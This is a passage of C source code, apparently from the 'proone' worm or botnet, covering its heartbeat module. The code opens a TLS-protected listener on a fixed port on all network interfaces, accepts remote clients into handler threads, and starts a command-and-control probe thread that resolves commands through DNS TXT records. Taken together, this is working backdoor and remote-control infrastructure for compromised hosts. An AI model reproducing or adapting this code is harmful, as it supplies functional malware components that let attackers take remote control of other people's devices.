			ev_root = pth_event(
				PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
				ctx->fd[0]);
		}
		prne_assert(ev_root != NULL);
		pth_event_concat(ev_root, ev_timeout, NULL);

		prne_assert(pth_mutex_acquire(ctx->cv.lock, FALSE, ev_timeout));
		pth_cond_await(ctx->cv.cond, ctx->cv.lock, ev_timeout);
		pth_mutex_release(ctx->cv.lock);
		if (!ctx->valid ||
			pth_event_status(ev_timeout) == PTH_STATUS_OCCURRED)
		{
			break;
		}

		f_ret = poll(pfd, 2, 0);
		if (f_ret < 0 && errno != EINTR) {
			break;
		}
		else if (f_ret == 0) {
			break;
		}
		else {
			if (pfd[1].revents & POLLOUT) {
				htbt_slv_consume_outbuf(ctx, 0, ev_timeout);
			}
			if (pfd[0].revents & POLLIN) {
				if (ctx->iobuf[0].avail == 0) {
					prne_dbgpf("** Malicious client?\n");
					ctx->valid = false;
					goto END;
				}
				f_ret = ctx->read_f(
					ctx->ioctx,
					ctx->iobuf[0].m + ctx->iobuf[0].len,
					ctx->iobuf[0].avail);
				if (f_ret <= 0) {
					ctx->valid = false;
					break;
				}
				prne_iobuf_shift(ctx->iobuf + 0, f_ret);

				if (htbt_slv_consume_inbuf(ctx, ev_timeout)) {
					pth_event_free(ev_timeout, FALSE);
					ev_timeout = NULL;
				}
			}
		}
	}

END:
	pth_event_free(ev_timeout, FALSE);
	ev_timeout = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_CLOSE_TIMEOUT));
	prne_assert(ev_timeout != NULL);

	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev_timeout);
	ctx->cleanup_f(ctx->ioctx, ev_timeout);

	pth_event_free(ev_root, FALSE);
	pth_event_free(ev_timeout, FALSE);

	ctx->valid = false;
	return NULL;
}

static void htbt_init_slv_ctx (htbt_slv_ctx_t *ctx) {
	ctx->fd[0] = -1;
	ctx->fd[1] = -1;
	prne_init_iobuf(ctx->iobuf + 0);
	prne_init_iobuf(ctx->iobuf + 1);
	ctx->ioctx = NULL;
	ctx->setup_f = NULL;
	ctx->cleanup_f = NULL;
	ctx->write_f = NULL;
	ctx->read_f = NULL;
	ctx->cbset = NULL;
	ctx->cv.broadcast = false;
	ctx->cv.lock = NULL;
	ctx->cv.cond = NULL;
	ctx->skip = 0;
	ctx->valid = true;
}

static void htbt_free_slv_ctx (htbt_slv_ctx_t *ctx) {
	if (ctx == NULL) {
		return;
	}
	prne_free_iobuf(ctx->iobuf + 0);
	prne_free_iobuf(ctx->iobuf + 1);
}

static bool htbt_lbd_slv_setup_f(void *ioctx, pth_event_t ev) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;

	return prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_handshake,
		ctx->fd,
		ev);
}

static void htbt_lbd_slv_cleanup_f(void *ioctx, pth_event_t ev) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;

	prne_mbedtls_pth_handle(&ctx->ssl, mbedtls_ssl_close_notify, ctx->fd, ev);
	prne_shutdown(ctx->fd, SHUT_RDWR);
}

static int htbt_lbd_slv_read_f(void *ioctx, void *buf, const size_t len) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	return mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);
}

static int htbt_lbd_slv_write_f(void *ioctx, const void *buf, const size_t len) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	return mbedtls_ssl_write(&ctx->ssl, (const unsigned char*)buf, len);
}

static void htbt_init_lbd_client (htbt_lbd_client_t *c) {
	c->pth = NULL;
	htbt_init_slv_ctx(&c->slv);
	mbedtls_ssl_init(&c->ssl);
	c->fd = -1;
}

static bool htbt_alloc_lbd_client (
	htbt_lbd_client_t *c,
	const int fd,
	prne_htbt_t *parent)
{
	const size_t PAGESIZE = prne_getpagesize();
	bool alloc;

	c->fd = c->slv.fd[0] = c->slv.fd[1] = fd;
	c->slv.ioctx = c;
	c->slv.setup_f = htbt_lbd_slv_setup_f;
	c->slv.cleanup_f = htbt_lbd_slv_cleanup_f;
	c->slv.read_f = htbt_lbd_slv_read_f;
	c->slv.write_f = htbt_lbd_slv_write_f;
	c->slv.cbset = &parent->param.cb_f;
	c->slv.cv.lock = &parent->lock;
	c->slv.cv.cond = &parent->cond;

	do {
		// TODO: switch after testing
		alloc = prne_alloc_iobuf(
			c->slv.iobuf + 0,
			PRNE_HTBT_PROTO_MIN_BUF);
		alloc &= prne_alloc_iobuf(
			c->slv.iobuf + 1,
			PRNE_HTBT_PROTO_SUB_MIN_BUF);
		if (alloc) {
			break;
		}

		alloc = prne_alloc_iobuf(
			c->slv.iobuf + 0,
			PAGESIZE);
		alloc &= prne_alloc_iobuf(
			c->slv.iobuf + 1,
			PAGESIZE);
		if (alloc) {
			break;
		}

		return false;
	} while (false);

	if (mbedtls_ssl_setup(&c->ssl, parent->param.lbd_ssl_conf) != 0) {
		return false;
	}
	mbedtls_ssl_set_bio(
		&c->ssl,
		&c->fd,
		prne_mbedtls_ssl_send_cb,
		prne_mbedtls_ssl_recv_cb,
		NULL);

	c->pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c->slv);
	if (c->pth == NULL) {
		return false;
	}

	return true;
}

static void htbt_free_lbd_client (htbt_lbd_client_t *c) {
	if (c == NULL) {
		return;
	}

	if (c->pth != NULL) {
		pth_abort(c->pth);
	}
	htbt_free_slv_ctx(&c->slv);
	mbedtls_ssl_free(&c->ssl);
	prne_close(c->fd);
}

static void htbt_lbd_setup_loop (prne_htbt_t *ctx) {
	uint8_t m_sckaddr[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	int optval;
	socklen_t sl;
	pth_event_t ev;

	while (ctx->loop_flag) {
		prne_memzero(m_sckaddr, sizeof(m_sckaddr));
		if ((ctx->lbd.fd = socket(AF_INET6, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in6* sa = (struct sockaddr_in6*)m_sckaddr;

			sa->sin6_addr = in6addr_any;
			sa->sin6_family = AF_INET6;
			sa->sin6_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in6);
		}
		else if ((ctx->lbd.fd = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in* sa = (struct sockaddr_in*)m_sckaddr;

			sa->sin_addr.s_addr = INADDR_ANY;
			sa->sin_family = AF_INET;
			sa->sin_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in);
		}
		else {
			goto ERR;
		}
		if (!prne_sck_fcntl(ctx->lbd.fd)) {
			goto ERR;
		}
		optval = 1;
		setsockopt(
			ctx->lbd.fd,
			SOL_SOCKET,
			SO_REUSEADDR,
			&optval,
			sizeof(optval));
		if (bind(ctx->lbd.fd, (struct sockaddr*)m_sckaddr, sl) != 0) {
			goto ERR;
		}
		if (listen(ctx->lbd.fd, HTBT_LBD_BACKLOG) != 0) {
			goto ERR;
		}

		break;
ERR:
		prne_close(ctx->lbd.fd);
		ctx->lbd.fd = -1;

		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_LBD_BIND_INT));
		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		pth_event_free(ev, FALSE);
	}
}

static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
	int fret;
	pth_event_t ev = NULL;
	prne_llist_entry_t *ent;
	htbt_lbd_client_t *client;
	pth_attr_t attr;
	pth_state_t ths;
	struct pollfd pfd;

	while (ctx->loop_flag) {
		pth_event_free(ev, TRUE);
		ev = pth_event(
			PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
			ctx->lbd.fd);
		prne_assert(ev != NULL);

		ent = ctx->lbd.conn_list.head;
		while (ent != NULL) {
			pth_event_t ev_sub = pth_event(
				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
				((htbt_lbd_client_t*)ent->element)->pth);
			prne_assert(ev_sub != NULL);
			pth_event_concat(ev, ev_sub, NULL);

			ent = ent->next;
		}

		prne_assert(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		pth_cond_await(&ctx->cond, &ctx->lock, ev);
		pth_mutex_release(&ctx->lock);
		if (!ctx->loop_flag) {
			break;
		}

		ent = ctx->lbd.conn_list.head;
		while (ent != NULL) {
			client = (htbt_lbd_client_t*)ent->element;

			attr = pth_attr_of(client->pth);
			prne_assert(pth_attr_get(attr, PTH_ATTR_STATE, &ths));
			pth_attr_destroy(attr);

			if (ths == PTH_STATE_DEAD) {
				pth_join(client->pth, NULL);
				client->pth = NULL;

				htbt_free_lbd_client(client);
				prne_free(client);

				ent = prne_llist_erase(&ctx->lbd.conn_list, ent);
			}
			else {
				ent = ent->next;
			}
		}

		pfd.fd = ctx->lbd.fd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 0) > 0) {
			if (!(pfd.revents & POLLIN)) {
				break;
			}

			fret = accept(ctx->lbd.fd, NULL, NULL);
			if (fret >= 0) {
				bool alloc;

				client = NULL;
				ent = NULL;
				do { // TRY
					client = (htbt_lbd_client_t*)prne_malloc(
						sizeof(htbt_lbd_client_t),
						1);
					if (client == NULL) {
						goto CATCH;
					}
					htbt_init_lbd_client(client);

					alloc = htbt_alloc_lbd_client(client, fret, ctx);
					fret = -1;
					if (!alloc) {
						goto CATCH;
					}

					ent = prne_llist_append(&ctx->lbd.conn_list, client);
					if (ent == NULL) {
						goto CATCH;
					}

					break;
CATCH:				// CATCH
					if (ent != NULL) {
						prne_llist_erase(&ctx->lbd.conn_list, ent);
					}
					if (client != NULL) {
						htbt_free_lbd_client(client);
					}
					prne_close(fret);
				} while (false);
				client = NULL;
				ent = NULL;
			}
		}
	}

	pth_event_free(ev, TRUE);

	ent = ctx->lbd.conn_list.head;
	while (ent != NULL) {
		client = (htbt_lbd_client_t*)ent->element;
		ent = ent->next;

		pth_join(client->pth, NULL);
		client->pth = NULL;

		htbt_free_lbd_client(client);
		prne_free(client);
	}
	prne_llist_clear(&ctx->lbd.conn_list);
}

static void *htbt_lbd_entry (void *p) {
	HTBT_INTP_CTX(p);

	htbt_lbd_setup_loop(ctx);
	htbt_lbd_serve_loop(ctx);

	return NULL;
}

prne_htbt_t *prne_alloc_htbt (
	prne_worker_t *w,
	const prne_htbt_param_t param)
{
	prne_htbt_t *ret = NULL;

	if (w == NULL ||
		param.cb_f.cnc_txtrec == NULL ||
		param.lbd_ssl_conf == NULL ||
		param.cncp_ssl_conf == NULL ||
		param.ctr_drbg == NULL ||
		param.resolv == NULL)
	{
		errno = EINVAL;
		goto ERR;
	}

	ret = prne_calloc(sizeof(prne_htbt_t), 1);
	if (ret == NULL) {
		goto ERR;
	}

	ret->param = param;
	prne_init_llist(&ret->main.req_q);
	ret->loop_flag = true;
	pth_mutex_init(&ret->lock);
	pth_cond_init(&ret->cond);

	ret->cncp.pth = NULL;

	ret->lbd.pth = NULL;
	ret->lbd.fd = -1;
	prne_init_llist(&ret->lbd.conn_list);

	pth_mutex_init(&ret->cncp.lock);
	pth_cond_init(&ret->cncp.cond);
	ret->cncp.pth = pth_spawn(
		PTH_ATTR_DEFAULT,
		htbt_cncp_entry,
		ret);
	if (ret->cncp.pth == NULL || pth_suspend(ret->cncp.pth) == 0) {
		goto ERR;
	}

	ret->lbd.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_lbd_entry, ret);
	if (ret->lbd.pth == NULL || pth_suspend(ret->lbd.pth) == 0) {
		goto ERR;
	}

	w->ctx = ret;
	w->entry = htbt_main_entry;
	w->fin = fin_htbt_wkr;
	w->free_ctx = free_htbt_wkr_ctx;

	return ret;
ERR:
	if (ret != NULL) {
		const int saved_errno = errno;
		free_htbt_wkr_ctx(ret);
		errno = saved_errno;
	}
	return NULL;
}

void prne_htbt_init_param (prne_htbt_param_t *p) {
	prne_memzero(p, sizeof(prne_htbt_param_t));
}

void prne_htbt_free_param (prne_htbt_param_t *p) {}
